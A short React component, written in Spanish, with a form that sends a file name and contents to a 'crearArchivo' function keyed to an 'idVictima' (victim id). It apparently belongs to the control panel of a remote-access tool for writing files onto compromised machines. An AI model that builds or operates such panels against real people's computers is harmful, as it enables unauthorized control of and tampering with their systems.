import React, { useContext, useState } from 'react';
import { ContextHome } from "../../context/ContextHome"


function CrearArchivos() {

    const [nombre, setnombre] = useState('')
    const [contenido, setcontenido] = useState('')

    const { idVictima, crearArchivo, respuestaArchivoCreado } = useContext(ContextHome)


    const CrearArchivo = (e) => {
        e.preventDefault();

        if (nombre != '' & contenido != '') {
            crearArchivo(idVictima, nombre, contenido)
        }else{
            alert("ingresa un nombre y un contenido")
        }

        setnombre('')
        setcontenido('')
    }


    return (
        <>
            {
                respuestaArchivoCreado && (
                    <div className="alert alert-info" role="alert">
                        {respuestaArchivoCreado}
                    </div>
                )
            }

            <div className="mb-3">
                <div className="row">
                    <div className="col-10"><input value={nombre} onChange={(e) => setnombre(e.target.value)} type="text" className="form-control" placeholder='nombre archivo' /></div>
                    <div className="col-2"><button onClick={(e) => CrearArchivo(e)} className='btn btn-danger' type='button'>Crear</button></div>
                </div>
            </div>


            <div className="mb-3">
                <textarea className="form-control" rows="15" placeholder='contenido'
                    value={contenido}
                    onChange={(e) => setcontenido(e.target.value)}>
                </textarea>
            </div>
        </>
    )
}

export default CrearArchivos